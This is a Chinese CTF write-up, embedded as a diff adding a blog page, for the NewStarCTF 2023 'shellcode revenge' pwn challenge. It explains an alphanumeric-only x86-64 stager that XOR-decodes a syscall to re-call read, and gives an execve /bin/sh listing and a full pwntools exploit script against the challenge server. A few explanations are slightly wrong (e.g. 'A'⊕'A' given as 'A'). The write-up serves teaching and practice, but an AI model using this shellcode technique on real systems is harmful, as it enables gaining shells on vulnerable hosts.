@@ -1,0 +1,234 @@
+<!DOCTYPE html><html lang="cn" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>[NewStarCTF 2023 公开赛道]shell code revenge | Kanyo’s Blogs</title><meta name="author" content="Kanyo"><meta name="copyright" content="Kanyo"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="特殊shellcode https:&#x2F;&#x2F;buuoj.cn&#x2F;challenges#[NewStarCTF%202023%20%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93]shellcode%20revenge  这道题有点像我之前做过的mrctf的shellcode的revenge。不过范围不一样。  大概看一下，把所有的大写字母和数字都排除在外了，意思是只要输入大写字">
+<meta property="og:type" content="article">
+<meta property="og:title" content="[NewStarCTF 2023 公开赛道]shell code revenge">
+<meta property="og:url" content="http://kanyooooo.github.io/docx/[NewStarCTF%202023%20%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93]shell%20code%20revenge/index.html">
+<meta property="og:site_name" content="Kanyo’s Blogs">
+<meta property="og:description" content="特殊shellcode https:&#x2F;&#x2F;buuoj.cn&#x2F;challenges#[NewStarCTF%202023%20%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93]shellcode%20revenge  这道题有点像我之前做过的mrctf的shellcode的revenge。不过范围不一样。  大概看一下，把所有的大写字母和数字都排除在外了，意思是只要输入大写字">
+<meta property="og:locale">
+<meta property="og:image" content="http://kanyooooo.github.io/img/logo.png">
+<meta property="article:published_time" content="2025-07-24T16:13:40.000Z">
+<meta property="article:modified_time" content="2025-07-24T16:32:59.108Z">
+<meta property="article:author" content="Kanyo">
+<meta property="article:tag" content="shellcode">
+<meta property="article:tag" content="PWN-writeup">
+<meta property="article:tag" content="buuctf">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://kanyooooo.github.io/img/logo.png"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "[NewStarCTF 2023 公开赛道]shell code revenge",
+  "url": "http://kanyooooo.github.io/docx/[NewStarCTF%202023%20%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93]shell%20code%20revenge/",
+  "image": "http://kanyooooo.github.io/img/logo.png",
+  "datePublished": "2025-07-24T16:13:40.000Z",
+  "dateModified": "2025-07-24T16:32:59.108Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "Kanyo",
+      "url": "http://Kanyooooo.github.io"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/logo.png"><link rel="canonical" href="http://kanyooooo.github.io/docx/[NewStarCTF%202023%20%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93]shell%20code%20revenge/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.json","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"No results found for: ${query}","hits_stats":"${hits} articles found"}},
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":true},
+  copy: {
+    success: 'Copy Successful',
+    error: 'Copy Failed',
+    noSupport: 'Browser Not Supported'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: 'Just now',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: 'Load More'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '[NewStarCTF 2023 公开赛道]shell code revenge',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg" style="background-image: url(/img/background.png);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/logo.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">18</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">14</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">1</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分類</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友情链接</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-link"></i><span> 好友の博客</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" target="_blank" rel="noopener" href="https://xxianxiayubanmian.github.io"><i class="fa-fw fas fa-user"></i><span> 大欢老师</span></a></li></ul></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/background.png);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="/img/logo.png" alt="Logo"><span class="site-name">Kanyo’s Blogs</span></a><a class="nav-page-title" href="/"><span class="site-name">[NewStarCTF 2023 公开赛道]shell code revenge</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  Back to Home</span></span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> Search</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分類</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友情链接</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-link"></i><span> 好友の博客</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" target="_blank" rel="noopener" href="https://xxianxiayubanmian.github.io"><i class="fa-fw fas fa-user"></i><span> 大欢老师</span></a></li></ul></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">[NewStarCTF 2023 公开赛道]shell code revenge</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2025-07-24T16:13:40.000Z" title="Created 2025-07-25 00:13:40">2025-07-25</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2025-07-24T16:32:59.108Z" title="Updated 2025-07-25 00:32:59">2025-07-25</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/PWN%E4%B8%8D%E5%87%BA%E6%9D%A5/">PWN不出来</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><blockquote>
+<p>特殊shellcode</p>
+<p><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[NewStarCTF%202023%20%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93]shellcode%20revenge">https://buuoj.cn/challenges#[NewStarCTF%202023%20%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93]shellcode%20revenge</a></p>
+</blockquote>
+<p>这道题有点像我之前做过的mrctf的shellcode的revenge。不过范围不一样。</p>
+<p><img src="/img/filesimg/%5BNewStarCTF%202023%20%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93%5Dshell%20code%20revenge/%5BNewStarCTF%202023%20%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93%5Dshell%20code%20revenge_0.png"></p>
+<p>大概看一下，把所有的大写字母和数字都排除在外了，意思是只要输入大写字母和数字就不会被break——跳出。</p>
+<p>所以我们要创造一个只有大写字母和数字的shellcode？</p>
+<p>然后我也懒得checksec了，而且用的是rsp——也就是64位。开了一些保护啥的，反正jumpout到的66660000h这个地址在上面的mmap里面写入了权限’7’（第三参数），也就是可读可写可执行。</p>
+<p>整个代码的逻辑是：出现Show me your magic之后，进入一个for循环，for循环一开始会有一个read让我们输入数据，因为是一个char类型指针<code>buf</code>，每次读取一个值。然后下面的<code>strncpy()</code>会把我们一个一个输入的buf存到src里面的src复制到我们的0x66660000地址里面，我们可以看main函数的堆栈视图：</p>
+<p><img src="/img/filesimg/%5BNewStarCTF%202023%20%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93%5Dshell%20code%20revenge/%5BNewStarCTF%202023%20%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93%5Dshell%20code%20revenge_1.png"></p>
+<p>我们要将数据存放到src的位置，而且只能输入264个字符（这264字符是可用的shellcode长度）。</p>
+<p>不过这道题目比较难，是一个可见字符shellcode。要构造一个可见字符shellcode还必须是大写和数字就很麻烦了，目前自动生成的大部分都是大小写+数字的组合。</p>
+<p>这边用了一个read函数，其中第一参数是0，也就是fd里面的标准输入，我输入进去的东西都会从这个里面获取到，第二参数是buf变量地址（一个指针）也就是读取的大小，第三参数是读取权限。</p>
+<p><img src="/img/filesimg/%5BNewStarCTF%202023%20%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93%5Dshell%20code%20revenge/%5BNewStarCTF%202023%20%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93%5Dshell%20code%20revenge_2.png"></p>
+<p>汇编这里会写的更清楚一点，edi的值变成了0。我们可以通过这个值进行运算，例如[edi+0x10]得到的值就是0+0x10&#x3D;0x10。</p>
+<p>现在的思路是，我可以用可见字符来构造一个最小的shellcode，目的是为了调用read函数，让read函数再一次读取值存放到66660000h这个地址上，覆盖我之前的为了调用read函数而构造的shellcode，再一次读取的shellcode不会有什么奇怪的判定条件，它可以直接执行我输入进去的任何东西。</p>
+<h1 id="构造第一段shellcode-read函数"><a href="#构造第一段shellcode-read函数" class="headerlink" title="构造第一段shellcode - read函数"></a>构造第一段shellcode - read函数</h1><p>构造可见ASCII shellcode是一个很麻烦的工作，我们先看一下普通的shellcode，拿64位举例：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">;;nasm -f elf64 shellcode64.asm</span><br><span class="line">;;ld -m elf_x86_64 -o shellcode64 shellcode64.o</span><br><span class="line">;;objdump -d shellcode64</span><br><span class="line">global _start</span><br><span class="line">_start:</span><br><span class="line">    mov rbx, &#x27;/bin/sh&#x27;     ; 把字符串&quot;/bin/sh&quot;的地址放到rbx寄存器</span><br><span class="line">    push rbx               ; 将&quot;/bin/sh&quot;的地址压入栈</span><br><span class="line">    push rsp               ; 把当前栈顶指针（指向&quot;/bin/sh&quot;地址）压入栈</span><br><span class="line">    pop rdi                ; 从栈弹出数据到rdi，使rdi指向&quot;/bin/sh&quot;</span><br><span class="line">    xor rsi, rsi           ; 清空rsi（argv参数设为0）</span><br><span class="line">    xor rdx, rdx           ; 清空rdx（envp参数设为0）</span><br><span class="line">    push 0x3b              ; 把系统调用号0x3b压入栈</span><br><span class="line">    pop rax                ; 从栈弹出数据到rax，设置系统调用号</span><br><span class="line">    syscall                ; 执行系统调用</span><br></pre></td></tr></table></figure>
+
+<p>最麻烦的部分就是<code>/bin/sh</code>和<code>syscall</code>，一个是字符串，另外一个是命令。其中<code>syscall</code>的机器码是<code>0x0f05</code>，汇编的书籍或Intel&#x2F;AMD开发者用书里面也会说到。</p>
+<p>可是syscall不是可见字符啊，更不是A-Z，0-9之间的数值。这要怎么办？</p>
+<h2 id="异或加密"><a href="#异或加密" class="headerlink" title="异或加密"></a>异或加密</h2><p>异或是一种逻辑运算，A<font style="color:rgb(17, 17, 17);">⊕</font>B得到的值是C，而C<font style="color:rgb(17, 17, 17);">⊕B之后得到的值就是A。逻辑如下：、</font></p>
+<p><img src="/img/filesimg/%5BNewStarCTF%202023%20%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93%5Dshell%20code%20revenge/%5BNewStarCTF%202023%20%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93%5Dshell%20code%20revenge_3.png" alt="image"></p>
+<p><font style="color:rgb(17, 17, 17);">如此，我就可以构造一个这样的设计：</font></p>
+<p><img src="/img/filesimg/%5BNewStarCTF%202023%20%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93%5Dshell%20code%20revenge/%5BNewStarCTF%202023%20%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93%5Dshell%20code%20revenge_4.png" alt="image"></p>
+<p><img src="/img/filesimg/%5BNewStarCTF%202023%20%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93%5Dshell%20code%20revenge/%5BNewStarCTF%202023%20%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93%5Dshell%20code%20revenge_5.png" alt="image"></p>
+<p><font style="color:rgb(17, 17, 17);">我们假设字符’A’为密钥，将syscall作为原始数据输入计算得到加密数据：0x0f05⊕0x4141&#x3D;0x4e44（都为可见字符），所以我们确实可以用它来作为密钥。</font></p>
+<p><font style="color:rgb(17, 17, 17);">加密后的syscall需要写入内存，但是直接写入的指令mov机器码很显然不是可见字符，而xor为可见字符0x33&#x3D;’3’。或者0x31&#x3D;’1’。</font></p>
+<p><font style="color:rgb(17, 17, 17);">为什么有两个？是因为xor的运算符定义是这样的：</font></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xor [a值], [b值]</span><br></pre></td></tr></table></figure>
+
+<p><font style="color:rgb(17, 17, 17);">而在汇编里面，寄存器需要放在前面，其他的放在后面，也就变成了:</font><code>&lt;font style=&quot;color:rgb(17, 17, 17);&quot;&gt;xor 寄存器, 其他值&lt;/font&gt;</code><font style="color:rgb(17, 17, 17);">，所代表的意思也就是将寄存器里面的值和其他值进行异或处理后，存储到寄存器里面。</font></p>
+<p><font style="color:rgb(17, 17, 17);">如果我们要实现：</font><code>&lt;font style=&quot;color:rgb(17, 17, 17);&quot;&gt;xor 其他值, 寄存器&lt;/font&gt;</code><font style="color:rgb(17, 17, 17);">，也就是将其他值和寄存器做异或处理后，将计算后的值存储到其他值里面，这个时候在机器码里面，依旧要按照：</font><code>&lt;font style=&quot;color:rgb(17, 17, 17);&quot;&gt;xor机器码 寄存器机器码，其他值&lt;/font&gt;</code><font style="color:rgb(17, 17, 17);">的顺序。</font></p>
+<p><font style="color:rgb(17, 17, 17);">于是就有了两个xor，一个代表的是第一种情况，一个代表第二种情况，分别为</font><code>&lt;font style=&quot;color:rgb(17, 17, 17);&quot;&gt;0x33&lt;/font&gt;</code><font style="color:rgb(17, 17, 17);">和</font><code>&lt;font style=&quot;color:rgb(17, 17, 17);&quot;&gt;0x31&lt;/font&gt;</code></p>
+<h2 id="异或解密syscall"><a href="#异或解密syscall" class="headerlink" title="异或解密syscall"></a>异或解密syscall</h2><p><font style="color:rgb(17, 17, 17);">这个时候我们就可以开始构造一些东西了，首先看代码，</font><img src="/img/filesimg/%5BNewStarCTF%202023%20%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93%5Dshell%20code%20revenge/%5BNewStarCTF%202023%20%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93%5Dshell%20code%20revenge_6.png"></p>
+<p>我们会发现在jmp到66660000h这个地址前，我们的eax被归0了，所以就可以利用这一点，配合xor来创造</p>
+<p><font style="color:rgb(17, 17, 17);">并且制造出syscall的加密数据形式0x4e444e44（输入两遍是为了防止一遍不运行）</font></p>
+<p><font style="color:rgb(17, 17, 17);">首先一开始是</font><code>&lt;font style=&quot;color:rgb(17, 17, 17);&quot;&gt;xor eax,NUM&lt;/font&gt;</code><font style="color:rgb(17, 17, 17);">，实际上是</font><code>&lt;font style=&quot;color:rgb(17, 17, 17);&quot;&gt;[rdx+0x38]&lt;/font&gt;</code><font style="color:rgb(17, 17, 17);">，为什么是</font><code>&lt;font style=&quot;color:rgb(17, 17, 17);&quot;&gt;rdx+NUM&lt;/font&gt;</code><font style="color:rgb(17, 17, 17);">？在这里我们看到esi和edx都被复制为了66660000h，实际上这个就是打定了</font><strong><font style="color:rgb(17, 17, 17);"> 内存区域中的基地址</font></strong><font style="color:rgb(17, 17, 17);"> ，那为什么偏偏是这个地址呢？这其实有点玄学，因为似乎rdx会作为这个偏移值的基地址，而刚好这边初始化了edx。而大概率选择了rdx作为基地址来偏移。</font></p>
+<p>我们构造这么一个逻辑：</p>
+<p><img src="/img/filesimg/%5BNewStarCTF%202023%20%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93%5Dshell%20code%20revenge/%5BNewStarCTF%202023%20%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93%5Dshell%20code%20revenge_7.png" alt="画板"></p>
+<p>这里面有很多零碎的知识点，我们先讲一个大概，后面慢慢补充：</p>
+<p>首先是上面的机器码部分，因为程序必须输入可见字符，其中第一部分的可见字符是0x30<del>0x39，可见字符’0’</del>‘9’的部分。我在这里输入的是<code>0x33 0x42 addr1</code>，这个代码的汇编样式是：<code>xor rax, [addr1]</code>，目的是将rax里面的值改成’A’，<code>0x42</code>是寄存器<code>rax</code>的机器码。rax的值一开始为0，A<font style="color:rgb(17, 17, 17);">⊕0&#x3D;A，而		</font></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">rax==0, [addr]==&#x27;A&#x27;</span><br><span class="line">rax=rax⊕[addr1]</span><br><span class="line">   =0⊕&#x27;A&#x27;</span><br><span class="line">   =&#x27;A&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><font style="color:rgb(17, 17, 17);">通过这一步，我就可以把rax的值改成’A’了。</font></p>
+<p><font style="color:rgb(17, 17, 17);">然后第二步，使用xor指令配合修改成’A’值的寄存器rax对下面的加密后syscall做处理。第一个加密syscall的起始地址为addr2，利用</font><code>&lt;font style=&quot;color:rgb(17, 17, 17);&quot;&gt;0x31 0x42 addr2&lt;/font&gt;</code><font style="color:rgb(17, 17, 17);">这个命令，就可以修改addr2中的数据。逻辑为：[addr2] ⊕ rax &#x3D;</font></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[addr2]==0x4e, rax==&#x27;A&#x27;</span><br><span class="line">[addr2]=[addr2]⊕rax</span><br><span class="line">       =0x4e⊕0x41</span><br><span class="line">       =0x0f</span><br></pre></td></tr></table></figure>
+
+<p>第三步，我们要还原rax寄存器的值为0，为什么？因为我们的核心逻辑是再调用一次read函数，然后读取我们写入的第二段shellcode（可以直接进入&#x2F;bin&#x2F;sh的）到特定的内存里，然后让PC，也就是程序计数器读到第二段shellcode的内容执行即可。用rax里面的值随便找一个’A’做异或即可。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">rax==&#x27;A&#x27; [addr1]==&#x27;A&#x27;</span><br><span class="line">rax=rax⊕[addr1]</span><br><span class="line">   =&#x27;A&#x27;⊕&#x27;A&#x27;</span><br><span class="line">   =&#x27;A&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>如此完成后，即可。</p>
+<p>现在的问题是<code>addr2</code>和<code>addr1</code>应该是多少？</p>
+<p>因为我们输入的<code>addr2</code>和<code>addr1</code>必须是可见字符，也就是0x30-0x39之间的数值，而二遍<code>syscall</code>最多占用四个地址。所以我们把第一个<code>syscall</code>的起始地址addr2放在0x30的位置就行了。中间用<code>pop rcx</code>这种方式来过度，他的机器码刚好也是一个可见字符，而rcx在程序中这个寄存器也没有用到，他里面的值是多少不重要（类似于<code>NOP</code>滑块指令，目的只是塞入值，并且让程序读到这些中间值又可以运行）</p>
+<p>而addr的地址则为0x30后4个数字（因为包括0x30，所以第4个数字实际上是0x33），在第五位的时候塞入数据’A’做填充。一般而言只要两个’A’就行了。我们这边填充8个A。所以第一段的代码就被写出来了：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">payload =  <span class="string">b&#x27;\x33\x42\x38&#x27;</span>  <span class="comment">#33 42 38 xor eax, DWORD PTR [rdx+0x38]</span></span><br><span class="line">payload += <span class="string">b&#x27;\x31\x42\x30&#x27;</span>  <span class="comment">#31 42 30 xor DWORD PTR [rdx+0x30], eax</span></span><br><span class="line">payload += <span class="string">b&#x27;\x33\x42\x38&#x27;</span>  <span class="comment">#33 42 38 xor eax, DWORD PTR [rdx+0x38]</span></span><br><span class="line"><span class="comment"># payload += b&#x27;\x31\x42\x38&#x27;  #31 42 38 xor DWORD PTR [rdx+0x38], eax 这个可以保证最后rdx0x38里面的值变成A？</span></span><br><span class="line">payload += <span class="string">b&#x27;\x59&#x27;</span>*(<span class="number">0x30</span>-<span class="built_in">len</span>(payload))  <span class="comment">#59 pop rcx</span></span><br><span class="line">payload += <span class="string">b&#x27;\x4e\x44&#x27;</span>*<span class="number">2</span>    <span class="comment">#syscall  0x4e^0x41=0xf 0x44^0x41=0x5</span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * <span class="number">8</span>        <span class="comment">#xor key</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;magic\n&quot;</span>,payload)</span><br></pre></td></tr></table></figure>
+
+<h3 id="一些没有讲的小问题"><a href="#一些没有讲的小问题" class="headerlink" title="一些没有讲的小问题"></a>一些没有讲的小问题</h3><p><img src="/img/filesimg/%5BNewStarCTF%202023%20%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93%5Dshell%20code%20revenge/%5BNewStarCTF%202023%20%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93%5Dshell%20code%20revenge_8.png" alt="画板"></p>
+<p>1、为什么我只异或了0x30地址上的4e，<code>syscall</code>却正常运作了呢？</p>
+<p>不知为何，寄存器不知道调用的是<code>eax</code>还是<code>rax</code>，其实不重要，他会与后面所有的字符A做异或，然后再与两个字节的<code>syscall</code>，也就是两个<code>0x4e44</code>做处理。如果我在这里后面的字符’A’只有两个的话就会与第一个<code>0x4e44</code>做处理，这个是gdb后的结果，原理是什么我也不清楚…所以字符’A’的长度必须大于2，不然<code>0x44</code>的部分就不会被处理了。</p>
+<p>2、如果我把<code>payload</code>中的\x38改成\x3a（也是存有’A’的地址），为什么运行不了呢？</p>
+<p>因为0x3a是字符’:’，不是可见字符……</p>
+<h1 id="第二段shellcode"><a href="#第二段shellcode" class="headerlink" title="第二段shellcode"></a>第二段shellcode</h1><p>第二段就很简单了，我只需要放入NOP字符滑过和覆盖之前的内容即可，然后再塞入&#x2F;bin&#x2F;sh的shellcode即可。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p.sendline(<span class="string">b&#x27;\x90&#x27;</span>*<span class="number">0x50</span>+asm(shellcraft.sh()))</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="全部代码："><a href="#全部代码：" class="headerlink" title="全部代码："></a>全部代码：</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#[NewStarCTF 2023 public race]shellcode revenge</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">ip=<span class="string">&#x27;node5.buuoj.cn&#x27;</span></span><br><span class="line">port=<span class="number">27424</span></span><br><span class="line">p = remote(ip,port)</span><br><span class="line"></span><br><span class="line">payload =  <span class="string">b&#x27;\x33\x42\x38&#x27;</span>  <span class="comment">#33 42 38 xor eax, DWORD PTR [rdx+0x38]</span></span><br><span class="line">payload += <span class="string">b&#x27;\x31\x42\x30&#x27;</span>  <span class="comment">#31 42 30 xor DWORD PTR [rdx+0x30], eax</span></span><br><span class="line">payload += <span class="string">b&#x27;\x33\x42\x38&#x27;</span>  <span class="comment">#33 42 38 xor eax, DWORD PTR [rdx+0x38]</span></span><br><span class="line">payload += <span class="string">b&#x27;\x59&#x27;</span>*(<span class="number">0x30</span>-<span class="built_in">len</span>(payload))  <span class="comment">#59 pop rcx</span></span><br><span class="line">payload += <span class="string">b&#x27;\x4e\x44&#x27;</span>*<span class="number">2</span>    <span class="comment">#syscall  0x4e^0x41=0xf 0x44^0x41=0x5</span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * <span class="number">8</span>        <span class="comment">#xor key</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;magic\n&quot;</span>,payload)</span><br><span class="line">pause()</span><br><span class="line">p.sendline(<span class="string">b&#x27;\x90&#x27;</span>*<span class="number">0x50</span>+asm(shellcraft.sh()))</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
